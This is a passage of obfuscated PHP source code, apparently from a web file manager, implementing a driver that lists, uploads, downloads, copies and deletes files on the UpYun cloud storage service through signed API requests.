$êç°šÍß = new PathDriverStream($ºú±‹³ñ, $ï÷œú¯£); return $êç°šÍß->hashMd5($ºú±‹³ñ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\x3a\57\x2f\x76\x30\56\141\160\151\56\165\160\x79\x75\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Šã¸Ç€°) { parent::__construct(); $this->_init($Šã¸Ç€°); } public function _init($ı§ïÜ®¤) { $ƒÄˆ”å =& $_SERVER[²Ö÷öõ]; foreach ($ı§ïÜ®¤ as $Ä½ºÁë => $»ªÌóœğ) { if (isset($this->{$Ä½ºÁë})) { $this->{$Ä½ºÁë} = $»ªÌóœğ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ƒÄˆ”å[1553] . LNG($ƒÄˆ”å[1472])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ìÛ¨•—Ï, $ñààéñ‹ = "\107\x45\x54") { $İ¯¾›ÍÄ =& $_SERVER[²Ö÷öõ]; $³ƒŠæ—ı = gmdate($İ¯¾›ÍÄ[1501]); $¡İöúÊ› = base64_encode(hash_hmac($İ¯¾›ÍÄ[1554], "{$ñààéñ‹}\x26{$ìÛ¨•—Ï}\46{$³ƒŠæ—ı}", md5("{$this->userpass}"), !0)); $¢÷¹îª = array("\x41\165\164\x68\157\162\151\x7a\141\164\x69\x6f\156\72\125\x50\131\x55\116\x20{$this->username}\x3a{$¡İöúÊ›}", "\x44\x61\164\145\x3a{$³ƒŠæ—ı}"); return $¢÷¹îª; } public function ussRequest($Æçëéıè, $×·íİÍİ = "\107\105\x54", $–­éúéË = false, $Ã«Ü¾üÂ = false, $–İÇØïÄ = false) { $Æ¥¡×Ä­ =& $_SERVER[²Ö÷öõ]; $Æçëéıè = trim($Æçëéıè, $Æ¥¡×Ä­[8]); $İ§òïºÁ = "\57{$this->bucket}\57{$Æçëéıè}"; $¬¹è£´ˆ = $this->ussHeaders($İ§òïºÁ, $×·íİÍİ); if ($Ã«Ü¾üÂ) { $¬¹è£´ˆ = array_merge($¬¹è£´ˆ, $Ã«Ü¾üÂ); } $æÀê÷×İ = url_request($this->endpoint . $İ§òïºÁ, $×·íİÍİ, $–­éúéË, $¬¹è£´ˆ, $–İÇØïÄ); if (!$æÀê÷×İ) { $í˜Ç•¸ = LNG($Æ¥¡×Ä­[1555]); $this->writeLog($í˜Ç•¸); return array($Æ¥¡×Ä­[1305] => !1, $Æ¥¡×Ä­[1295] => $í˜Ç•¸); } if (strtolower($×·íİÍİ) == $Æ¥¡×Ä­[227] || in_array($æÀê÷×İ[$Æ¥¡×Ä­[1305]], array($Æ¥¡×Ä­[274], $Æ¥¡×Ä­[1556]))) { $–­éúéË = $æÀê÷×İ[$Æ¥¡×Ä­[1557]]; } else { $–­éúéË = json_decode($æÀê÷×İ[$Æ¥¡×Ä­[1295]], !0); if (!$–­éúéË) { $–­éúéË = $æÀê÷×İ[$Æ¥¡×Ä­[1295]]; } else { if (!$æÀê÷×İ[$Æ¥¡×Ä­[833]] && isset($–­éúéË[$Æ¥¡×Ä­[1558]])) { $–­éúéË = $–­éúéË[$Æ¥¡×Ä­[1558]]; } } } if (!$æÀê÷×İ[$Æ¥¡×Ä­[833]]) { $this->writeLog($this->__errorMessage($–­éúéË)); } return array($Æ¥¡×Ä­[1305] => $æÀê÷×İ[$Æ¥¡×Ä­[833]], $Æ¥¡×Ä­[1295] => $–­éúéË); } private function __errorMessage($ìä¤¦”) { $¸Ë¶õà­ =& $_SERVER[²Ö÷öõ]; if (!$ìä¤¦”) { return $¸Ë¶õà­[12]; } static $Ì“Ó·ò× = null; if (!$Ì“Ó·ò×) { $Ì“Ó·ò× = I18n::getType(); } if ($Ì“Ó·ò× != $¸Ë¶õà­[1511]) { return $ìä¤¦”; } $¢Ë±Ò² = array($¸Ë¶õà­[1559] => $¸Ë¶õà­[1560], $¸Ë¶õà­[1561] => $¸Ë¶õà­[1562], $¸Ë¶õà­[1563] => $¸Ë¶õà­[1562], $¸Ë¶õà­[1564] => $¸Ë¶õà­[1565], $¸Ë¶õà­[1566] => $¸Ë¶õà­[1567], $¸Ë¶õà­[1568] => $¸Ë¶õà­[1569], $¸Ë¶õà­[1570] => $¸Ë¶õà­[1571]); return isset($¢Ë±Ò²[$ìä¤¦”]) ? $¢Ë±Ò²[$ìä¤¦”] : $ìä¤¦”; } public function mkfile($™ª½úáÃ, $½ÏÄ€ = '', $›üµâ°Ç = REPEAT_RENAME) { if ($this->setContent($™ª½úáÃ, $½ÏÄ€)) { return $this->getPathOuter($™ª½úáÃ); } return !1; } public function mkdir($ƒ×ı‘Íã, $ëĞÃæå = REPEAT_SKIP) { $Ê²ç¥Ô =& $_SERVER[²Ö÷öõ]; $–®‰üÛÄ = trim($ƒ×ı‘Íã, $Ê²ç¥Ô[8]); if ($this->_isFolder($–®‰üÛÄ)) { return $this->getPathOuter($–®‰üÛÄ); } $¾½ŠñËµ = array($Ê²ç¥Ô[1572]); $ù¸ŒÂŸü = $this->ussRequest($–®‰üÛÄ, $Ê²ç¥Ô[257], !1, $¾½ŠñËµ); return $ù¸ŒÂŸü[$Ê²ç¥Ô[1305]] ? $this->getPathOuter($–®‰üÛÄ) : !1; } public function copyFile($øä±‹ä•, $É˜ÍÛÂ•) { $ŠÙÍûª„ =& $_SERVER[²Ö÷öõ]; $î²ùœÉ÷ = array($ŠÙÍûª„[1573] . "\x2f{$this->bucket}\57{$øä±‹ä•}", $ŠÙÍûª„[1574]); $ºƒ˜Øı = $this->ussRequest($É˜ÍÛÂ•, $ŠÙÍûª„[259], !1, $î²ùœÉ÷); return $ºƒ˜Øı[$ŠÙÍûª„[1305]] ? !0 : $this->getPathOuter($É˜ÍÛÂ•); } public function moveFile($€ÕÏ§å, $ü€óõ©í) { $óÔ€Â¸ =& $_SERVER[²Ö÷öõ]; $ Ñê‹’ª = array($óÔ€Â¸[1575] . "\57{$this->bucket}\57{$€ÕÏ§å}", $óÔ€Â¸[1574]); $¡Úé¢Ğš = $this->ussRequest($ü€óõ©í, $óÔ€Â¸[259], !1, $ Ñê‹’ª); return $¡Úé¢Ğš[$óÔ€Â¸[1305]] ? !0 : $this->getPathOuter($ü€óõ©í); } public function delFile($ù†Ãö£ß) { $ÉÏçˆ¾Ï =& $_SERVER[²Ö÷öõ]; $¶è¾“èç = $this->ussRequest($ù†Ãö£ß, $ÉÏçˆ¾Ï[1576]); return $¶è¾“èç[$ÉÏçˆ¾Ï[1305]] ? !0 : !1; } public function delFolder($²½ëÑ¢) { $£Ùè—Î© =& $_SERVER[²Ö÷öõ]; if (!$this->exist($²½ëÑ¢)) { return !0; } $this->listItemCache = !1; $ÉÊ‘ƒÌ = $áµä®Ğñ = array(); $this->fileList($²½ëÑ¢, $ÉÊ‘ƒÌ, $áµä®Ğñ, !0); $this->listItemCache = !0; foreach ($áµä®Ğñ as $ÚàËà€é) { $É¦ˆƒ… = $this->ussRequest($ÚàËà€é[$£Ùè—Î©[32]], $£Ùè—Î©[1576]); if (!$É¦ˆƒ…[$£Ùè—Î©[1305]]) { return !1; } } foreach ($ÉÊ‘ƒÌ as $Æîäìç) { $É¦ˆƒ… = $this->ussRequest($Æîäìç, $£Ùè—Î©[1576]); if (!$É¦ˆƒ…[$£Ùè—Î©[1305]]) { return !1; } } $É¦ˆƒ… = $this->ussRequest($²½ëÑ¢, $£Ùè—Î©[1576]); return $É¦ˆƒ…[$£Ùè—Î©[1305]]; } public function rename($ÅÊ¨œĞ, $‹é™­´Ş) { if ($this->isFile($ÅÊ¨œĞ)) { $‹é™­´Ş = get_path_father($ÅÊ¨œĞ) . $‹é™­´Ş; return $this->moveFile($ÅÊ¨œĞ, $‹é™­´Ş); } return $this->renameObject($ÅÊ¨œĞ, $‹é™­´Ş); } public function fileInfo($äùø›ğ, $Ãù›ü§½ = false, $¶öÇÒìå = array()) { $îÕ¼Ç•É =& $_SERVER[²Ö÷öõ]; $ú«ÊÂ = array($îÕ¼Ç•É[32] => $this->pathThis($äùø›ğ), $îÕ¼Ç•É[87] => $this->getPathOuter($îÕ¼Ç•É[8] . $äùø›ğ), $îÕ¼Ç•É[33] => $îÕ¼Ç•É[230], $îÕ¼Ç•É[79] => isset($¶öÇÒìå[$îÕ¼Ç•É[79]]) ? $¶öÇÒìå[$îÕ¼Ç•É[79]] : 0, $îÕ¼Ç•É[169] => $this->ext($äùø›ğ)); if ($Ãù›ü§½) { return $ú«ÊÂ; } $ú«ÊÂ[$îÕ¼Ç•É[231]] = $ú«ÊÂ[$îÕ¼Ç•É[88]] = 0; $ú«ÊÂ[$îÕ¼Ç•É[232]] = $ú«ÊÂ[$îÕ¼Ç•É[233]] = !0; if (empty($¶öÇÒìå)) { $¶öÇÒìå = $this->objectMeta($äùø›ğ); if (!$¶öÇÒìå) { return $ú«ÊÂ; } } $ú«ÊÂ[$îÕ¼Ç•É[231]] = intval($¶öÇÒìå[$îÕ¼Ç•É[1577]]); $ú«ÊÂ[$îÕ¼Ç•É[88]] = intval($¶öÇÒìå[$îÕ¼Ç•É[1578]]); $ú«ÊÂ[$îÕ¼Ç•É[79]] = $¶öÇÒìå[$îÕ¼Ç•É[79]]; return $ú«ÊÂ; } public function folderInfo($á›–‹¿¯, $—‹„éÊÚ = false) { $‹£Ş…¼‡ =& $_SERVER[²Ö÷öõ]; $ÇÙ÷›Èû = array($‹£Ş…¼‡[32] => $this->pathThis($á›–‹¿¯), $‹£Ş…¼‡[87] => $this->getPathOuter($‹£Ş…¼‡[8] . $á›–‹¿¯), $‹£Ş…¼‡[33] => $‹£Ş…¼‡[78]); if ($—‹„éÊÚ) { return $ÇÙ÷›Èû; } $ÇÙ÷›Èû[$‹£Ş…¼‡[231]] = $ÇÙ÷›Èû[$‹£Ş…¼‡[88]] = 0; $ÇÙ÷›Èû[$‹£Ş…¼‡[232]] = $ÇÙ÷›Èû[$‹£Ş…¼‡[233]] = !0; if (empty($Ë†‹½Ôí)) { $Ë†‹½Ôí = $this->objectMeta($á›–‹¿¯); if (!$Ë†‹½Ôí) { return $ÇÙ÷›Èû; } } $ÇÙ÷›Èû[$‹£Ş…¼‡[231]] = intval($Ë†‹½Ôí[$‹£Ş…¼‡[1577]]); $ÇÙ÷›Èû[$‹£Ş…¼‡[88]] = intval($Ë†‹½Ôí[$‹£Ş…¼‡[1578]]); return $ÇÙ÷›Èû; } private function listObjs($¡µ¬¤‡ƒ, $Œ½Å¨’Ü = 0, $¢µÊ†¬ = 1000) { $äÓÂŞ™µ =& $_SERVER[²Ö÷öõ]; $Î‘ÃŒ³‚ = array($äÓÂŞ™µ[1579], $äÓÂŞ™µ[1580] . $¢µÊ†¬); if ($Œ½Å¨’Ü) { $Î‘ÃŒ³‚[] = $äÓÂŞ™µ[1581] . $Œ½Å¨’Ü; } $‡ı² = $this->ussRequest($¡µ¬¤‡ƒ, $äÓÂŞ™µ[261], !1, $Î‘ÃŒ³‚); return !$‡ı²[$äÓÂŞ™µ[1305]] ? !1 : $‡ı²[$äÓÂŞ™µ[1295]]; } private function fileList($ŞËêßİ, &$Û°ñ®††, &$˜©¯©Éñ, $úñ€ÏÑÛ = false) { $¿©Øßõ =& $_SERVER[²Ö÷öõ]; $”ˆšìÛ = $¿©Øßõ[12]; $ŸÓ¨³”ß = 1000; $éòÛØĞ = rtrim($ŞËêßİ, $¿©Øßõ[8]) . $¿©Øßõ[8]; while (!0) { check_abort(); $ûÄÆéî® = $this->listObjs($ŞËêßİ, $”ˆšìÛ, $ŸÓ¨³”ß); if (!$ûÄÆéî®) { return !1; } $”ˆšìÛ = isset($ûÄÆéî®[$¿©Øßõ[1582]]) ? $ûÄÆéî®[$¿©Øßõ[1582]] : $¿©Øßõ[12]; $ãĞëŞ“ = isset($ûÄÆéî®[$¿©Øßõ[1583]]) ? $ûÄÆéî®[$¿©Øßõ[1583]] : array(); foreach ($ãĞëŞ“ as $°Ûêª¬ş) { $…©ñ©ìˆ = $°Ûêª¬ş[$¿©Øßõ[33]] == $¿©Øßõ[78] ? !0 : !1; $ôôéôıÙ = ltrim($éòÛØĞ . $°Ûêª¬ş[$¿©Øßõ[32]], $¿©Øßõ[8]) . ($…©ñ©ìˆ ? $¿©Øßõ[8] : $¿©Øßõ[12]); $¨¾ÄèŒ = array($¿©Øßõ[32] => $ôôéôıÙ, $¿©Øßõ[33] => $…©ñ©ìˆ ? $¿©Øßõ[78] : $¿©Øßõ[230], $¿©Øßõ[79] => $°Ûêª¬ş[$¿©Øßõ[413]], $¿©Øßõ[1578] => $°Ûêª¬ş[$¿©Øßõ[1584]]); $this->cacheMethodInfoSet($ôôéôıÙ, $…©ñ©ìˆ, $¨¾ÄèŒ); if ($…©ñ©ìˆ) { $Û°ñ®††[] = $ôôéôıÙ; if ($úñ€ÏÑÛ) { $this->fileList($ôôéôıÙ, $Û°ñ®††, $˜©¯©Éñ, $úñ€ÏÑÛ); } continue; } $˜©¯©Éñ[] = $¨¾ÄèŒ; } if (count($ãĞëŞ“) < $ŸÓ¨³”ß) { break; } } $this->cacheMethodInfoSet($ŞËêßİ, !0); } public function listPath($øöµµ ‘, $†¼Å¼€ë = false) { $²Õ–ç =& $_SERVER[²Ö÷öõ]; $¹¼ªìÀ´ = $ ¬Ê˜ = array(); $this->fileList($øöµµ ‘, $¹¼ªìÀ´, $ ¬Ê˜); foreach ($¹¼ªìÀ´ as $’Ó©«· => $­„úö–…) { $¹¼ªìÀ´[$’Ó©«·] = $this->folderInfo($­„úö–…, $†¼Å¼€ë); } foreach ($ ¬Ê˜ as $’Ó©«· => $­„úö–…) { $ ¬Ê˜[$’Ó©«·] = $this->fileInfo($­„úö–…[$²Õ–ç[32]], $†¼Å¼€ë, $­„úö–…); } return array($²Õ–ç[85] => $¹¼ªìÀ´, $²Õ–ç[86] => $ ¬Ê˜); } public function has($Úßë§¡´, $´ÓÔØİ§ = false, $ÖÛŞâ”Å = true) { $ğ´üÛÏ± =& $_SERVER[²Ö÷öõ]; $¹Õô = $ğ´üÛÏ±[12]; $ÍÜá”Â„ = 500; $ÀÔÕ©Î = 0; $™é«‘™Ø = 0; $õÉ‡˜àß = rtrim($Úßë§¡´, $ğ´üÛÏ±[8]) . $ğ´üÛÏ±[8]; while (!0) { check_abort(); $×¿¸ïÔ = $this->listObjs($Úßë§¡´, $¹Õô, $ÍÜá”Â„); if (!$×¿¸ïÔ) { return !1; } $¹Õô = isset($×¿¸ïÔ[$ğ´üÛÏ±[1582]]) ? $×¿¸ïÔ[$ğ´üÛÏ±[1582]] : $ğ´üÛÏ±[12]; $Ú”à¬ˆÄ = isset($×¿¸ïÔ[$ğ´üÛÏ±[1583]]) ? $×¿¸ïÔ[$ğ´üÛÏ±[1583]] : array(); if (empty($Ú”à¬ˆÄ)) { break; } $¶ÈÒéê‡ = array_filter($Ú”à¬ˆÄ, function ($¤Ç©æ¢) { $©¢ó‚º’ =& $_SERVER[²Ö÷öõ]; return $¤Ç©æ¢[$©¢ó‚º’[33]] == $©¢ó‚º’[78]; }); $‚“µ½’ş = count($Ú”à¬ˆÄ); $¶ÈÒéê‡ = count($¶ÈÒéê‡); $‡‹ç´ŒÉ = $‚“µ½’ş - $¶ÈÒéê‡; if ($´ÓÔØİ§) { $™é«‘™Ø += $¶ÈÒéê‡; $ÀÔÕ©Î += $‡‹ç´ŒÉ; if ($‚“µ½’ş < $ÍÜá”Â„) { break; } continue; } if ($ÖÛŞâ”Å) { if ($‡‹ç´ŒÉ) { return !0; } } else { if ($¶ÈÒéê‡) { return !0; } } if ($‚“µ½’ş < $ÍÜá”Â„) { break; } } if ($´ÓÔØİ§) { return array($ğ´üÛÏ±[239] => $ÀÔÕ©Î, $ğ´üÛÏ±[240] => $™é«‘™Ø); } return !1; } public function listAll($€Ÿ¾ü) { $‰¡õ“–¢ =& $_SERVER[²Ö÷öõ]; $Ëá¨Á×â = $÷À–Æø = array(); $this->fileList($€Ÿ¾ü, $Ëá¨Á×â, $÷À–Æø, !0); $‚¼ûô’¬ = array_to_keyvalue($÷À–Æø, $‰¡õ“–¢[32]); foreach ($Ëá¨Á×â as $À—ş˜Çˆ) { if (is_string($À—ş˜Çˆ)) { $‚¼ûô’¬[$À—ş˜Çˆ] = array($‰¡õ“–¢[79] => 0); } } return $this->listAllFiles($€Ÿ¾ü, $‚¼ûô’¬); } public function canRead($ÖØè§óÂ) { return $this->exist($ÖØè§óÂ) ? !0 : !1; } public function canWrite($‡ú·îŒ¥) { return $this->exist($‡ú·îŒ¥) ? !0 : !1; } public function getContent($áúÜŠâ) { return $this->fileSubstr($áúÜŠâ, 0, -1); } public function setContent($Àïš¾Æ, $ÛÑ†£şŞ = '') { $ÚÃı·øö =& $_SERVER[²Ö÷öõ]; if (!$ÛÑ†£şŞ) { $Ü¶éƒŠ‘ = $this->ussRequest($Àïš¾Æ, $ÚÃı·øö[257]); return $Ü¶éƒŠ‘[$ÚÃı·øö[1305]]; } $˜Æ–¨„õ = $this->tempFile($this->pathThis($Àïš¾Æ)); file_put_contents($˜Æ–¨„õ, $ÛÑ†£şŞ); if ($this->upload($Àïš¾Æ, $˜Æ–¨„õ)) { $this->tempFileRemve($˜Æ–¨„õ); return !0; } return !1; } public function fileSubstr($¼Ù–€¢¢, $…øÑò®ğ, $öà«Â´Õ) { $¸˜ÇƒÖš =& $_SERVER[²Ö÷öõ]; if (!($ÉšÀÌ¯‚ = $this->link($¼Ù–€¢¢))) { return !1; } $Ÿùá´Ã = !1; if ($öà«Â´Õ > 0) { $©äİ¥Õ = $…øÑò®ğ + $öà«Â´Õ - 1; $Ÿùá´Ã = array($¸˜ÇƒÖš[1543] . $…øÑò®ğ . $¸˜ÇƒÖš[462] . $©äİ¥Õ); } $•³û»ì = url_request($ÉšÀÌ¯‚, $¸˜ÇƒÖš[261], !1, $Ÿùá´Ã); return $•³û»ì[$¸˜ÇƒÖš[833]] ? $•³û»ì[$¸˜ÇƒÖš[1295]] : !1; } public function upload($£îİÙ, $âëüÇ²™, $ˆ“Ô­›• = false, $ñ³ŞÀª– = REPEAT_REPLACE) { $äõ½É÷‹ =& $_SERVER[²Ö÷öõ]; $Ñ€·é“ = IO::size($âëüÇ²™); if ($Ñ€·é“ <= 1024 * 1024 * 200) { $éõòûÇ– = array($äõ½É÷‹[1585] . $âëüÇ²™); $ÈŸ¨‘â‚ = $this->ussRequest($£îİÙ, $äõ½É÷‹[259], $éõòûÇ–); return $ÈŸ¨‘â‚[$äõ½É÷‹[1305]] ? $this->getPathOuter($£îİÙ) : !1; } $ÎßØÕ‰Ç = 1024 * 1024 * 10; $íùÙà†¸ = array($äõ½É÷‹[1586], $äõ½É÷‹[1587] . $Ñ€·é“, $äõ½É÷‹[1588], $äõ½É÷‹[1589] . $ÎßØÕ‰Ç); $ÈŸ¨‘â‚ = $this->ussRequest($£îİÙ, $äõ½É÷‹[259], !1, $íùÙà†¸); if (!$ÈŸ¨‘â‚[$äõ½É÷‹[1305]]) { return !1; } $Šˆ¢Ã×€ = $ÈŸ¨‘â‚[$äõ½É÷‹[1295]]; $ßÒé’ô = 0; $¸¾÷½° = $Šˆ¢Ã×€[$äõ½É÷‹[1590]]; $Æ¸Ì¨ÒÀ = fopen($âëüÇ²™, $äõ½É÷‹[1466]); if (!$Æ¸Ì¨ÒÀ) { return !1; } do { $¦ŒšÓäô = $Šˆ¢Ã×€[$äõ½É÷‹[1591]]; fseek_64($Æ¸Ì¨ÒÀ, $ßÒé’ô); $ƒ˜¦ü¾ª = fread($Æ¸Ì¨ÒÀ, $¦ŒšÓäô); $“Œ¸ÄÂ = 0; do { $“Œ¸ÄÂ++; $Šˆ¢Ã×€ = $this->uploadPart($£îİÙ, $Šˆ¢Ã×€, $ƒ˜¦ü¾ª); } while (!$Šˆ¢Ã×€ && $“Œ¸ÄÂ < 3); if (!$Šˆ¢Ã×€) { return !1; } $¸¾÷½° = $Šˆ¢Ã×€[$äõ½É÷‹[1590]]; $ßÒé’ô += $¦ŒšÓäô; } while ($¸¾÷½° != -1); fclose($Æ¸Ì¨ÒÀ); $íùÙà†¸ = array($äõ½É÷‹[1592], $äõ½É÷‹[1593] . $Šˆ¢Ã×€[$äõ½É÷‹[1594]], $äõ½É÷‹[1588]); $ÈŸ¨‘â‚ = $this->ussRequest($£îİÙ, $äõ½É÷‹[259], !1, $íùÙà†¸); return $ÈŸ¨‘â‚[$äõ½É÷‹[1305]] ? $this->getPathOuter($ğîüûã„) : !1; } private function uploadPart($şÉ©ÚÏï, $Ó÷é€‡°, &$“‚ÕŠƒÉ) { $ßº¼¿öÀ =& $_SERVER[²Ö÷öõ]; $›±öÇŠŸ = array($ßº¼¿öÀ[1595], $ßº¼¿öÀ[1593] . $Ó÷é€‡°[$ßº¼¿öÀ[1594]], $ßº¼¿öÀ[1596] . $Ó÷é€‡°[$ßº¼¿öÀ[1590]], $ßº¼¿öÀ[146] . $Ó÷é€‡°[$ßº¼¿öÀ[1591]]); $Ó¿Äß­è = $this->ussRequest($şÉ©ÚÏï, $ßº¼¿öÀ[259], $“‚ÕŠƒÉ, $›±öÇŠŸ); return !$Ó¿Äß­è[$ßº¼¿öÀ[1305]] ? $Ó¿Äß­è[$ßº¼¿öÀ[1305]] : $Ó¿Äß­è[$ßº¼¿öÀ[1295]]; } public function uploadFormData($ûš·´ö­, $ô¬‰†»Á = 3600) { return $this->uploadPolicy($ûš·´ö­, $ô¬‰†»Á); } public function multiUploadFormData($×½‹ïÎ, $˜½‹¦¯¤ = 3600) { $¿½»ê±¥ =& $_SERVER[²Ö÷öõ]; $·ê½®Íë = (int) $GLOBALS[$¿½»ê±¥[7]][$¿½»ê±¥[79]]; return $this->uploadPolicy($×½‹ïÎ, $˜½‹¦¯¤, $·ê½®Íë); } private function uploadPolicy($”‡­æˆ‹, $§³õ¶™˜ = 3600, $ç±Ò´õ = 0) { $æöŸÙÓ =& $_SERVER[²Ö÷öõ]; $ù”ÔÄ¸Œ = $æöŸÙÓ[8] . $this->bucket; $ë²şËó¨ = gmdate($æöŸÙÓ[1501]); $˜ˆÖ€‡  = array($æöŸÙÓ[1597] => $this->bucket, $æöŸÙÓ[1598] => $”‡­æˆ‹, $æöŸÙÓ[1599] => time() + $§³õ¶™˜, $æöŸÙÓ[1600] => $ë²şËó¨); if ($ç±Ò´õ) { $˜ˆÖ€‡ [$æöŸÙÓ[1486]] = $ç±Ò´õ; } $÷¦”ßëğ = base64_encode(json_encode($˜ˆÖ€‡ )); $‹Œ½Ù¶‹ = base64_encode(hash_hmac($æöŸÙÓ[1554], "\120\x4f\123\x54\46{$ù”ÔÄ¸Œ}\46{$ë²şËó¨}\46{$÷¦”ßëğ}", md5("{$this->userpass}"), !0)); $¾«³‚· = array($æöŸÙÓ[293] => $÷¦”ßëğ, $æöŸÙÓ[1601] => "\125\x50\x59\x55\116\40{$this->username}\72{$‹Œ½Ù¶‹}", $æöŸÙÓ[208] => $this->endpoint . $ù”ÔÄ¸Œ); return $¾«³‚·; } public function download($Æ…ïäÃà, $ï¹úª°) { $×¹ªºü = IO::getPathInner(IO::mkfile($ï¹úª°)); if (!($ÌïãĞ = $this->link($Æ…ïäÃà))) { return !1; } $÷™Ş¯£• = 0; $Šãàå³ = 1024 * 200; $´ä¼Ó¸œ = fopen($×¹ªºü, $_SERVER[²Ö÷öõ][1549]); while (!0) { $Ùéè•êø = $this->fileSubstr($Æ…ïäÃà, $÷™Ş¯£•, $Šãàå³); if ($Ùéè•êø === !1) { return !1; } fwrite($´ä¼Ó¸œ, $Ùéè•êø); $÷™Ş¯£• += $Šãàå³; if (strlen($Ùéè•êø) < $Šãàå³) { break; } } fclose($´ä¼Ó¸œ); return $ï¹úª°; } public function link($¿ÚŸ˜„È, $§ƒÑÒ­² = array()) { $¦À×‡æ² =& $_SERVER[²Ö÷öõ]; $¿ÚŸ˜„È = trim($¿ÚŸ˜„È, $¦À×‡æ²[8]); if (!empty($this->token)) { $àñ´¬ñ = strtotime(date($¦À×‡æ²[1602])); $ÕÚ§Î­¢ = substr(md5($this->token . $¦À×‡æ²[360] . $àñ´¬ñ . $¦À×‡æ²[1603] . $¿ÚŸ˜„È), 12, 8) . $àñ´¬ñ; $§ƒÑÒ­²[] = $¦À×‡æ²[1604] . $ÕÚ§Î­¢; } $Ï¡¿»¡× = !empty($§ƒÑÒ­²) ? $¦À×‡æ²[76] . implode($¦À×‡æ²[360], $§ƒÑÒ­²) : $¦À×‡æ²[12]; return $this->getHost() . $¦À×‡æ²[8] . $¿ÚŸ˜„È . $Ï¡¿»¡×; } public function fileOut($„¸Ö¼Åâ, $²úü‰²õ = false, $®¦Œİ = false, $©›Ò¨¦Ô = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($„¸Ö¼Åâ, $²úü‰²õ, $®¦Œİ, $©›Ò¨¦Ô); } if (!$®¦Œİ) { $®¦Œİ = $this->pathThis($„¸Ö¼Åâ); } $ ıŒğ´Ã = $²úü‰²õ ? array($_SERVER[²Ö÷öõ][1605] . rawurlencode($®¦Œİ)) : array(); $™Õá‹ë = $this->link($„¸Ö¼Åâ, $ ıŒğ´Ã); $this->fileOutLink($™Õá‹ë); } public function fileOutServer($Â¾…“¼¸, $è¹‘‰†  = false, $¾ò­º› = false, $‘ £Û€ = '') { parent::fileOut($Â¾…“¼¸, $è¹‘‰† , $¾ò­º›, $‘ £Û€); } public function fileOutImage($ÌØñ§í¡, $ñ€ì”ĞÚ = 250) { $¨ÔØš¸Ä = $this->link($ÌØñ§í¡ . $_SERVER[²Ö÷öõ][1606] . $ñ€ì”ĞÚ); $this->fileOutLink($¨ÔØš¸Ä); } public function fileOutImageServer($¯ıØâ©¸, $ˆøé´©Ú = 250) { parent::fileOutImage($¯ıØâ©¸, $ˆøé´©Ú); } public function hashMd5($šÑªœ…×) { $¶‚£¯Ó =& $_SERVER[²Ö÷öõ]; $Ì˜ŸÂ‹Ñ = $this->_objectMeta($šÑªœ…×); return isset($Ì˜ŸÂ‹Ñ[$¶‚£¯Ó[245]]) ? $Ì˜ŸÂ‹Ñ[$¶‚£¯Ó[245]] : !1; } public function size($‘¨¼ÂÁ‰) { $Âö¦ÓÈ = $this->objectMeta($‘¨¼ÂÁ‰); return $Âö¦ÓÈ ? $Âö¦ÓÈ[$_SERVER[²Ö÷öõ][79]] : 0; } public function info($½ÁÖ²³ò) { if ($this->isFolder($½ÁÖ²³ò)) { return $this->folderInfo($½ÁÖ²³ò); } else { if ($this->isFile($½ÁÖ²³ò)) { return $this->fileInfo($½ÁÖ²³ò); } } return !1; } public function exist($° äÏÃ©) { return $this->isFile($° äÏÃ©) || $this->isFolder($° äÏÃ©); } public function isFile($ã•èÛìŠ) { return !$this->isFolder($ã•èÛìŠ) && $this->objectMeta($ã•èÛìŠ); } public function isFolder($‚¡–™ÀÃ) { return $this->cacheMethod($_SERVER[²Ö÷öõ][179], $‚¡–™ÀÃ); } protected function objectMeta($ŸØù¹î¡) { return $this->cacheMethod($_SERVER[²Ö÷öõ][181], $ŸØù¹î¡); } protected function _objectMeta($ÚÏŠ½¾Œ) { $ŠõÆ± =& $_SERVER[²Ö÷öõ]; if ($ÚÏŠ½¾Œ == $ŠõÆ±[12] || $ÚÏŠ½¾Œ == $ŠõÆ±[8]) { return array(); } $–ƒÅ¨È÷ = $this->ussRequest($ÚÏŠ½¾Œ, $ŠõÆ±[1607]); if (!$–ƒÅ¨È÷[$ŠõÆ±[1305]]) { return null; } $¤òôùê† = isset($–ƒÅ¨È÷[$ŠõÆ±[1295]]) ? $–ƒÅ¨È÷[$ŠõÆ±[1295]] : array(); if (!isset($¤òôùê†[$ŠõÆ±[1608]])) { return null; } $¯×Û„˜Ğ = array($ŠõÆ±[33] => isset($¤òôùê†[$ŠõÆ±[1608]]) ? $¤òôùê†[$ŠõÆ±[1608]] : null, $ŠõÆ±[79] => isset($¤òôùê†[$ŠõÆ±[1609]]) ? $¤òôùê†[$ŠõÆ±[1609]] : null, $ŠõÆ±[245] => isset($¤òôùê†[$ŠõÆ±[1610]]) ? $¤òôùê†[$ŠõÆ±[1610]] : null, $ŠõÆ±[1577] => isset($¤òôùê†[$ŠõÆ±[1611]]) ? $¤òôùê†[$ŠõÆ±[1611]] : null); $¯×Û„˜Ğ[$ŠõÆ±[1578]] = isset($¤òôùê†[$ŠõÆ±[1612]]) ? strtotime($¤òôùê†[$ŠõÆ±[1612]]) : $¯×Û„˜Ğ[$ŠõÆ±[1577]]; return $¯×Û„˜Ğ; } protected function _isFolder($ÔÂÅĞƒ) { $ëåèóÇ =& $_SERVER[²Ö÷öõ]; if ($ÔÂÅĞƒ == $ëåèóÇ[12] || $ÔÂÅĞƒ == $ëåèóÇ[8]) { return !0; } $ôµ²¢ßû = $this->_objectMeta($ÔÂÅĞƒ); return isset($ôµ²¢ßû[$ëåèóÇ[33]]) && $ôµ²¢ßû[$ëåèóÇ[33]] == $ëåèóÇ[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($»Æ›ÙğÏ = false) { } public function exist($»ú©¹Ä¥) { $×·”Œ» = $this->info($»ú©¹Ä¥); return $×·”Œ»[$_SERVER[²Ö÷öõ][232]]; } public function isFile($Æıë¤Ê) { $âù„Òö» = $this->info($Æıë¤Ê); return $âù„Òö»[$_SERVER[²Ö÷öõ][232]]; } public function isFolder($Ë×Æ¦) { return !1; } public function size($¹­Í•) { $óÖöß = $this->info($¹­Í•); return $óÖöß[$_SERVER[²Ö÷öõ][79]]; } public function info($’İ‹˜øí) 